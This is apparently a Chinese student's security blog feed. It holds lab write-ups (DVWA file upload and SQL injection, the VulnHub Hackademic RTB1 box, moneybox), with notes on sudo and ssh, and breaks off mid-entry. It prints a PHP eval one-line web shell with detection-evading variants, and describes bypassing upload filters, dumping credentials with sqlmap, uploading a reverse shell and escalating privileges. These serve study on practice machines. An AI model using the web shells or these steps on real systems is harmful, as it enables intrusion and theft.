      <link href="/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/11/24/owasp%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p><p>文件上传是 Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p><p>我们先从<strong>一句话木马</strong>说起</p><h1 id="1-一句话木马"><a href="#1-一句话木马" class="headerlink" title="1.一句话木马"></a>1.一句话木马</h1><p><code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</code><br>这便是最简单的一句话木马。<br>这段php代码被分为以下几个部分：<br>**@**表示后面即使执行错了，也不会报错。<br>**eval()**函数表示将括号里的内容当作代码执行。<br><strong>$_POST[‘123’]<strong>表示从页面中获得123这个参数值。<br>也就是说，该页面只要收到了</strong>123</strong>这个密码，就会按照eval()的逻辑去运行。<br>只要了解了该文件的路径，便可以对该机器（利用菜刀或蚁剑）为所欲为了。<br>一句话木马还有很多变种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @assert($\_REQUEST[123]); ?&gt; // GET 数据从url提交</span><br><span class="line">POST 数据采用隐蔽方式提交</span><br><span class="line">REQUEST即支持GET方式、又支持POST方式</span><br><span class="line">&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k($\_REQUSET[&#x27;123&#x27;]);?&gt;</span><br><span class="line">//利用字符串绕过检测的一句话木马</span><br><span class="line">....以下略</span><br></pre></td></tr></table></figure><h1 id="2-渗透过程"><a href="#2-渗透过程" class="headerlink" title="2.渗透过程"></a>2.渗透过程</h1><p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a></p><h2 id="低等级（Security-low）"><a href="#低等级（Security-low）" class="headerlink" title="低等级（Security&#x3D;low）"></a>低等级（Security&#x3D;low）</h2><p>我们先通过右下角的<strong>view source</strong>按钮来观察网页代码 寻找规律<br><img src="1.png" alt="1"><br>可以看到该网站并没有对上传的文件类型与大小做较为明显的防备<br>漏洞很大<br>那么我们创建一个1.php 在其中加上代码<code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</code><br><img src="2.jpg" alt="2"><br>随后登陆网站 上传 完事<br><img src="3.jpg" alt="3"><br>至于kali下载蚁剑的方式：<a href="https://blog.csdn.net/liver100day/article/details/120222378">参考资料</a><br>我们打开蚁剑 按照网页所给提示 文件被上传在了<br><a href="http://192.168.246.132/dvwa/hackable/uploads/1.php">http://192.168.246.132/dvwa/hackable/uploads/1.php</a> 处<br>在<strong>url地址</strong>中填入前者 在<strong>连接密码</strong>中填入123<br>先<strong>测试链接</strong> 然后按保存<br>测试链接显示成功其实就已经完事了<br><img src="4.jpg" alt="4"><br>随后研究蚁剑 你便会发现它的功能全备 非常厉害</p><h2 id="中等级-（Security-medium）"><a href="#中等级-（Security-medium）" class="headerlink" title="中等级 （Security&#x3D;medium）"></a>中等级 （Security&#x3D;medium）</h2><p>我们先通过<strong>DVWA Security</strong>将安全度调整至medium<br><img src="5.jpg" alt="5"><br>然后继续进入上传漏洞网页 <strong>view source</strong><br><img src="6.jpg" alt="6"><br>可以看到这次的上传对<strong>上传的文件类型</strong>与<strong>上传的文件大小</strong>做了限制<br>文件类型限制为<strong>jpeg</strong>文件 大小限制在了<strong>100000byte</strong>以内（1KB&#x3D;1024B byte&#x3D;B&#x3D;字节)<br>文件大小由于使用一句话木马 因此可以轻松解决<br>文件类型的问题则可以使用多种方法来解析</p><h3 id="1-利用burpsuite"><a href="#1-利用burpsuite" class="headerlink" title="1)利用burpsuite"></a>1)利用burpsuite</h3><p><strong>关于burpsuite的配置</strong><br><img src="7.jpg" alt="7"><br>↑<strong>proxy-proxy setting中设置本地地址与端口</strong><br><img src="8.jpg" alt="8"><br><img src="9.jpg" alt="9"><br>配置firefox中的<strong>设置-proxy settings</strong> 注意ip与端口要与前者保持一致<br><img src="10.jpg" alt="10"><br>进入上传漏洞的网页 按这个按钮就能开始监听<br>先分析一下刚才得到的条件：<br>文件类型<strong>仅限jpeg</strong><br>那我们便将<strong>一句话木马.php</strong>文件的后缀更改为<strong>jpeg</strong>交给前端 通过<strong>burpsuite</strong>更改后缀来修改成<strong>php</strong>文件类型<br>那么开始实践<br><img src="11.jpg" alt="11"><br>将<strong>1.php</strong>复制一份备份 其中一份更名为<strong>1.jpeg</strong><br>开启<strong>burpsuite</strong>的监听 将<strong>1.jpeg</strong>上传至网站 等待拦截结果<br><img src="12.jpg" alt="12"><br>网站一直处于加载中 且<strong>burpsuite</strong>显示拦截结果 说明成功拦截<br>我们将<code>filename=“1.jpeg”</code>更改为<code>filename=“1.php”</code><br>随后点击<code>forward</code>放行<br><img src="14.jpg" alt="14"><br><img src="15.jpg" alt="15"><br>可以看到上传成功 我们继续在蚁剑里测试<br><img src="16.jpg" alt="16"><br>好的 链接也成功了 这说明目标已完成</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackademic.RTB1</title>
      <link href="/2023/11/21/Hackademic-RTB1/"/>
      <url>/2023/11/21/Hackademic-RTB1/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>那么好的我们废话不多说——</strong></p></blockquote><p>靶机名称： Hackademic: RTB1<br>下载链接：<br><a href="https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip</a></p><h1 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h1><p>首先我们下载好靶机 照常启动kali与靶机<br><img src="1.jpg" alt="1.jpg"></p><h1 id="2-解析过程"><a href="#2-解析过程" class="headerlink" title="2.解析过程"></a>2.解析过程</h1><h2 id="1）靶机的发现"><a href="#1）靶机的发现" class="headerlink" title="1）靶机的发现"></a>1）靶机的发现</h2><p>老样子扫描同网段设备<br><code>arp-scan -l</code><br><img src="2.jpg" alt="2.jpg"><br>↑发现靶机ip地址 使用nmap扫描存活端口<br><code>nmap -p- &#39;目标ip&#39;</code><br><strong>ps:多半扫得很慢 不知道什么原因 请耐心等待2-5分钟</strong><br>结果出来是22端口和80端口<br>我们这里直接通过firefox访问ip<br><img src="3.jpg" alt="3.jpg"><br>↑页面通过f12并没有看出什么端倪 但有很多超链接<br>通过在网址后输入sql注入语句<br>我们可以判断出其中一个指向了mysql数据库<br>于是将该网址交给sqlmap 看是否能爆出数据</p><h2 id="2）sqlmap爆破"><a href="#2）sqlmap爆破" class="headerlink" title="2）sqlmap爆破"></a>2）sqlmap爆破</h2><p>我们利用以下语句来爆出数据库的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;目标ip&quot; //查看是否存在漏洞</span><br><span class="line">sqlmap -u &quot;目标ip&quot; --dbs //查看具体数据库</span><br><span class="line">sqlmap -u &quot;目标ip&quot; -D &quot;选定数据库&quot; --tables //查看数据库内的表</span><br><span class="line">sqlmap -u &quot;目标ip&quot; -D &quot;选定数据库&quot; -T &quot;选定表&quot; --columns //查看数据表内的集合</span><br><span class="line">sqlmap -u &quot;目标ip&quot; -D &quot;选定数据库&quot; -T &quot;选定表&quot; -C &quot;选定集合&quot; --dump //爆出集合内的数据</span><br></pre></td></tr></table></figure><p><img src="4.jpg" alt="4.jpg"><br>↑查看网址是否存在漏洞 与当前数据类型<br><img src="5.jpg" alt="5.jpg"><br>↑爆数据库<br><img src="6.jpg" alt="6.jpg"><br>↑爆tables<br><img src="7.jpg" alt="7.jpg"><br>↑通过外语翻译看出login与pass是账号密码相关内容<br><img src="8.jpg" alt="8.jpg"><br>↑最终得出了五组账号密码<br><strong>ps:没有解密出的密码可以自行用md5解码解密</strong></p><h2 id="3）后门网址发现与上传漏洞"><a href="#3）后门网址发现与上传漏洞" class="headerlink" title="3）后门网址发现与上传漏洞"></a>3）后门网址发现与上传漏洞</h2><p>我们利用dirsearch工具来发现网站下存在的目录<br><code>dirsearch -u &quot;目标ip&quot;</code><br><img src="9.jpg" alt="9.jpg"><br><img src="10.jpg" alt="10.jpg"><br>↑扫过ip根目录与刚才主页底下的目录后 我们发现了一个名为wp-admin的后门网址<br>于是我们进去看看<br>刚刚有五组账号 我们都试试看 看看哪个权限最大<br>都试过之后发现GerogeMiller账号权限最高 还能让我们上传任意格式的文件<br>kali里是自带一些后端监听php的 我们可以自己复制一个到桌面里编辑后<br>通过kali自带的apache服务来上传文件<br><img src="11.jpg" alt="11.jpg"><br>↑我们在网站options中选择允许文件上传 增加上传格式php<br>刷新页面后上面会出现uploads 让我们上传文件<br><img src="12.jpg" alt="12.jpg"><br>↑这是自带的后门文件<br><img src="13.jpg" alt="13.jpg"><br>↑将监听的返回对象设为本机<br><img src="14.jpg" alt="14.jpg"><br><img src="15.jpg" alt="315.jpg"><br>↑上传完毕后网站会提示你上传的地址 我们在监听后 用firefox复制 访问<br><img src="16.jpg" alt="16.jpg"><br>↑监听完毕之后 我们发现靶机的版本较老旧 有不少漏洞<br><img src="17.jpg" alt="17.jpg"><br>↑ 我们利用searchsploit工具来搜索该机子的漏洞 发现15285.c这个程序可以成功提权（前提是目标计算机安装了gcc程序编译器）<br><img src="18.jpg" alt="18.jpg"><br><img src="19.jpg" alt="19.jpg"><br>↑上传后运行该漏洞 成功获取权限<br><img src="20.jpg" alt="20.jpg"><br>成功获取flag！</p><h1 id="那么我们下次见"><a href="#那么我们下次见" class="headerlink" title="那么我们下次见"></a><strong>那么我们下次见</strong></h1>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>owasp与sql注入与sqlmap</title>
      <link href="/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/"/>
      <url>/2023/11/14/owasp%E4%B8%8Esql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/</url>
      
        <content type="html"><![CDATA[<p>owasp下载地址:<br><a href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a><br>注:如遇dvwa无法更改难度 多半为cookie所致 请随以下教程删除网站的缓存：<a href="https://support.mozilla.org/zh-CN/kb/Deleting%20cookies">请点这里</a></p><h2 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h2><p>首先 我们下载owasp 打开后输入<strong>默认账号</strong>root 与 <strong>默认密码</strong>owaspbwa<br><img src="2.jpg"><br>随后会显示<strong>登录成功</strong> 输入指定ip进入网页<a href="http://192.168.246.132/">http://192.168.246.132</a><br>另开一个<strong>kali</strong> 随后进入网页<br><img src="1.jpg" alt="1.jpg"><br>这里选择<strong>Damn Vulnerable Web Application</strong> 也是我们今天要解析的靶机</p><h2 id="2-靶机部分"><a href="#2-靶机部分" class="headerlink" title="2.靶机部分"></a>2.靶机部分</h2><p><img src="3.jpg" alt="3.jpg"><br>如果小伙伴们只需要dvwa的默认密码去登录dvwa，这里给出dvwa的默认密码</p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>admin</td><td>password</td></tr><tr><td>gordonb</td><td>abc123</td></tr><tr><td>1337</td><td>charley</td></tr><tr><td>pablo</td><td>letmein</td></tr><tr><td>smithy</td><td>password</td></tr></tbody></table><p>进入 选择<strong>SQL Injection</strong><br>首先是测试一下sqlmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;靶机地址&quot; //判断目标是否存在sql注入可能</span><br></pre></td></tr></table></figure><p><img src="4.jpg" alt="4.jpg"><br>可以看到它爆出了有注入漏洞 数据库类型为 <strong>mysql</strong> 且所在操作系统为 <strong>linux</strong><br>我们加入一下cookie 尝试爆出数据库看看<br><img src="5.jpg" alt="5.jpg"><br>↑获取cookie请在该页面按f12 切到<strong>network</strong> reload后查看页面详细 其中有cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;目标网址&quot; --cookie &quot;网址cookie&quot; --dbs</span><br></pre></td></tr></table></figure><p>看到俩库<br><img src="6.jpg" alt="6.jpg"><br>dvwa和information_schema<br>information_schema是每个mysql数据库都会自带的所以暂且搁置 我们转到dvwa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;靶机网址&quot; --cookie=&quot;网址cookie&quot; -D 数据库名 --tables //获取指定数据库表名</span><br></pre></td></tr></table></figure><p>结果是两个表<br><img src="7.jpg" alt="7.jpg"><br>那我们字面意思来看 guestbook是留言簿 那users明显是用户相关信息了<br>我们查看一下users里的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;靶机网址&quot; --cookie=&quot;网址cookie&quot; -D 数据库名 -T 表名 --dump //获取指定表中的信息</span><br></pre></td></tr></table></figure><p>有选项都直接按<strong>enter</strong>默认过去<br><img src="8.jpg" alt="8.jpg"></p><blockquote><p>ps: 如果窗口拉的不够长会导致表格被拉伸难以看清 我的建议是在生成结果前尽可能全屏</p></blockquote><p>password后边的括号里边的内容是解密后破解出的明文密码 前面则是加密后的密文<br>登陆时使用 <strong>user对应的账号</strong> 与 <strong>password中的明文密码</strong> 则ok<br>剩下的等老师继续讲 我们先说到这里</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> 靶机解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶机解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>liunx中sudo服务相关知识</title>
      <link href="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="老样子-跟随课程进度"><a href="#老样子-跟随课程进度" class="headerlink" title="老样子 跟随课程进度"></a>老样子 跟随课程进度</h1><h2 id="1）什么是sudo涅？"><a href="#1）什么是sudo涅？" class="headerlink" title="1）什么是sudo涅？"></a>1）什么是sudo涅？</h2><blockquote><p>简单的说，sudo 是一种权限管理机制，管理员可以授权于一些普通用户去执行一些 root 执行的操作，而不需要知道 root 的密码。</p></blockquote><blockquote><p>严谨些说，sudo 允许一个已授权用户以超级用户或者其它用户的角色运行一个命令。当然，能做什么不能做什么都是通过安全策略来指定的。sudo 支持插件架构的安全策略，并能把输入输出写入日志。第三方可以开发并发布自己的安全策略和输入输出日志插件，并让它们无缝的和 sudo 一起工作。默认的安全策略记录在 &#x2F;etc&#x2F;sudoers 文件中。而安全策略可能需要用户通过密码来验证他们自己。也就是在用户执行 sudo 命令时要求用户输入自己账号的密码。如果验证失败，sudo 命令将会退出。</p></blockquote><blockquote><p>sudo暂时切换到超级用户模式以执行超级用户权限，提示输入密码时该密码为当前用户的密码，而不是超级账户的密码。不过有时间限制，Ubuntu默认为一次时长15分钟。</p></blockquote><blockquote><p>由于不需要超级用户的密码，部分类Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例如Ubuntu、[Mac OS X]。</p></blockquote><h2 id="2）sudo命令语法"><a href="#2）sudo命令语法" class="headerlink" title="2）sudo命令语法"></a>2）sudo命令语法</h2><p><code>sudo [-bhHpV] [-s ] [-u &lt;用户&gt;] [指令]</code><br>或<br><code>sudo [-klv]</code><br>参数<br>-b 在后台执行指令。<br>-h 显示帮助。<br>-H 将HOME环境变量设为新身份的HOME环境变量。<br>-k 结束密码的有效期限，也就是下次再执行sudo时便需要输入密码。<br>-l 列出目前用户可执行与无法执行的指令。<br>-p 改变询问密码的提示符号。<br>-s 执行指定的shell。<br>-u &lt;用户&gt; 以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份。<br>-v 延长密码有效期限5分钟。<br>-V 显示版本信息。<br>-S 从标准输入流替代终端来获取密码</p><h2 id="3）基本配置"><a href="#3）基本配置" class="headerlink" title="3）基本配置"></a>3）基本配置</h2><p>系统默认创建了一个名为 sudo 的组。只要把用户加入这个组，用户就具有了 sudo 的权限。<br>至于如何把用户加入 sudo 组，您可以直接编辑 &#x2F;etc&#x2F;group 文件，当然您得使用一个有 sudo 权限的用户来干这件事：<br>先创建用户并设置密码后，然后在sudo组中加入该用户，多个用户用逗号隔开。<br><img src="1.png" alt="1.png"><br>添加内容如下：<br><img src="2.png" alt="2.png"><br>我们把用户 testuser 添加到了 sudo 组中，所以当用户 testuser 登录后就可以通过 sudo 命令以 root 权限执行命令了！<br>但是，用testuser执行root权限的命令时会报错：<br>解决办法：<br>1)、切换到root用户下<br>普通用户切换到root用户下：sudo -i<br>root用户切换到普通用户下：su testuser</p><p>2)、添加sudo文件的写权限,命令是:<br>chmod u+w &#x2F;etc&#x2F;sudoers</p><p>3)、编辑sudoers文件<br>vi &#x2F;etc&#x2F;sudoers<br>找到这行 root ALL&#x3D;(ALL) ALL,在他下面添加xxx ALL&#x3D;(ALL) ALL (这里的xxx是你的用户名)<br><img src="3.png" alt="3.png"><br>ps:这里说下你可以sudoers添加下面四行中任意一条<br>youuser ALL&#x3D;(ALL) ALL<br>%youuser ALL&#x3D;(ALL) ALL<br>youuser ALL&#x3D;(ALL) NOPASSWD: ALL<br>%youuser ALL&#x3D;(ALL) NOPASSWD: ALL</p><p>第一行:允许用户youuser执行sudo命令(需要输入密码).<br>第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码).<br>第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码.<br>第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码.</p><p>4)、撤销sudoers文件写权限,命令:<br>chmod u-w &#x2F;etc&#x2F;sudoers</p><p>这样普通用户就可以使用sudo了。</p><p>4、sudo命令的日志</p><p>在 ubuntu 中，sudo 的日志默认被记录在 &#x2F;var&#x2F;log&#x2F;auth.log 文件中。当我们执行 sudo 命令时，相关日志都是会被记录下来的。比如下图中显示的就是一次执行 sudo 命令的日志。<br>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>liunx中ssh服务相关知识</title>
      <link href="/2023/11/08/linux%E4%B8%ADssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/11/08/linux%E4%B8%ADssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="最近课程讲到了ssh服务-故此做个记录"><a href="#最近课程讲到了ssh服务-故此做个记录" class="headerlink" title="最近课程讲到了ssh服务 故此做个记录"></a>最近课程讲到了ssh服务 故此做个记录</h1><h2 id="1）ssh是什么涅？"><a href="#1）ssh是什么涅？" class="headerlink" title="1）ssh是什么涅？"></a>1）ssh是什么涅？</h2><blockquote><p><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a> 叫安全外壳协议（<strong>S</strong>ecure <strong>Sh</strong>ell），是一种加密的网络传输协议，可在不安全的网络中网络服务提供安全的传输环境。它通过在网络中创建安全隧道来实现 SSH 客户端和服务器之间的连接。</p></blockquote><h2 id="2）ssh的原理是什么涅？"><a href="#2）ssh的原理是什么涅？" class="headerlink" title="2）ssh的原理是什么涅？"></a>2）ssh的原理是什么涅？</h2><blockquote><p>SSH 之所以一经提出，就得到了快速发展，是因为数据的安全性对任何人都非常重要。这里我们对其保护数据安全的原理进行探究。</p></blockquote><p>在聊加密前先介绍一下几个密码学的基本概念：</p><ul><li>明文<code>plaintext</code> 指传送方（一般指客户端）想要接受方（一般指服务端）获得的<strong>可读信息</strong></li><li>密文<code>ciphertext</code> 指明文进过加密后所产生的信息</li><li>秘钥<code>key</code> 指用来完成加密、解密、完整性验证等密码学应用的密码信息，是明文转换为密文或密文转换为明文的算法需要的参数</li><li>私钥 指私有的秘钥</li><li>公钥 指公开的秘钥</li></ul><p>常见的加密有两种：<strong>对称加密</strong>和<strong>非对称加密</strong><br>对称加密: 加密和解密的秘钥使用的是同一个.<br>非对称加密: 与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。</p><p>对称加密算法: 密钥较短，破译困难，除了数据加密标准（DES），另一个对称密钥加密系统是国际数据加密算法（IDEA），它比DES的加密性好，且对计算机性能要求也没有那么高.<br>优点:<br>算法公开、计算量小、加密速度快、加密效率高<br>缺点:<br>在数据传送前，发送方和接收方必须商定好秘钥，然后 使双方都能保存好秘钥。其次如果一方的秘钥被泄露，那么加密信息也就不安全了。另外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的唯一秘钥，这会使得收、发双方所拥有的钥匙数量巨大，密钥管理成为双方的负担。<br>常见的对称加密算法有: DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES</p><p>非对称加密算法: 公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。</p><p>非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将其中的一把作为公用密钥向其它方公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。甲方只能用其专用密钥解密由其公用密钥加密后的任何信息。<br>优点:<br>安全<br>缺点:<br>速度较慢<br>常见的非对称加密算法有: RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p><h2 id="3）ssh登录与免密登录的方式"><a href="#3）ssh登录与免密登录的方式" class="headerlink" title="3）ssh登录与免密登录的方式"></a>3）ssh登录与免密登录的方式</h2><p>登录方式:<br><code>ssh 用户名@ip地址</code><br>免密登录方式：<br>生成公共身份验证密钥并将其附加到远程主机 ~&#x2F;.ssh&#x2F;authorized_keys 文件即可。<br><strong>具体步骤</strong>：</p><ol><li><p>检查现有的 SSH 密钥对。<br>在生成新的 SSH 密钥对之前，首先检查您的客户端计算机上是否已有 SSH 密钥，因为您不想覆盖现有密钥。<br>运行以下 ls 命令以查看是否存在现有 SSH 密钥：<br><code>ls -al ~/.ssh/id_*.pub</code><br>如果存在现有密钥，您可以使用这些密钥并跳过下一步或备份旧密钥并生成新密钥。<br>如果您看到 No such file or directory 或 no matches found 意味着您没有 SSH 密钥，则可以继续执行下一步并生成新密钥。</p></li><li><p>生成新的 SSH 密钥对。<br>以下命令将生成一个新的密钥对：<br><code>ssh-keygen</code><br>按 Enter 接受则默认文件位置和文件名：<br><code>Enter file in which to save the key (/home/yourusername/.ssh/id_rsa):</code><br>接下来，ssh-keygen 工具将要求您键入安全密码。无论您是否想要使用密码短语都取决于您，如果您选择使用密码短语，您将获得额外的安全保护。在大多数情况下，开发人员和系统管理员使用 SSH 而不使用密码，因为它们对完全自动化的流程很有用。如果您不想使用密码短语，请按 Enter<br><code>Enter passphrase (empty for no passphrase):</code></p></li><li><p>要确认是否已经生成 SSH 密钥，您可以使用以下命令列出新的私钥和公钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls ~/.ssh/id\_\*</span><br><span class="line">/home/yourusername/.ssh/id\_rsa /home/yourusername/.ssh/id\_rsa.pub</span><br></pre></td></tr></table></figure></li><li><p>复制公钥<br>现在您已经生成了 SSH 密钥对，为了能够在没有密码的情况下登录到您的服务器，您需要将公钥复制到您要管理的服务器。<br>将公钥复制到服务器的最简单方法是使用名为的命令 ssh-copy-id 。在您的本地机器终端类型：<br><code>ssh-copy-id remote_username@server_ip_address</code><br>系统将提示您输入 remote_username 的密码：<br><code>remote_username@server_ip_address&#39;s password:</code><br>用户通过身份验证后，公钥将附加到远程用户 authorized_keys 文件，并且将关闭连接。<br>如果由于某种原因， ssh-copy-id 本地计算机上没有该实用程序，则可以使用以下命令复制公钥：<br><code>cat ~/.ssh/id_rsa.pub | ssh remote_username@server_ip_address &quot;mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys&quot;</code></p></li><li><p>使用 SSH 密钥登录服务器<br>完成上述步骤后，您应该能够登录到远程服务器而不会被提示输入密码。<br>尝试通过 SSH 登录到您的服务器：<br><code>ssh remote_username@server_ip_address</code><br>如果一切顺利，您将立即登录。</p></li></ol><h2 id="4）参考资料"><a href="#4）参考资料" class="headerlink" title="4）参考资料"></a>4）参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/235610836">深入了解SSH</a>————知乎<br><a href="https://blog.csdn.net/weixin_57099902/article/details/132717146">如何设置SSH免密登录</a>————CSDN</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moneybox解析</title>
      <link href="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p><h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p><p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p><h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p><p><img src="step1.jpg" alt="step1.jpg"></p><p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init&#x3D;bin&#x2F;bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img src="step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p><h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali&#x2F;kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img src="step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0&#x2F;24</strong>扫描一下这些ip开放的端口<br><img src="step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p><h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous 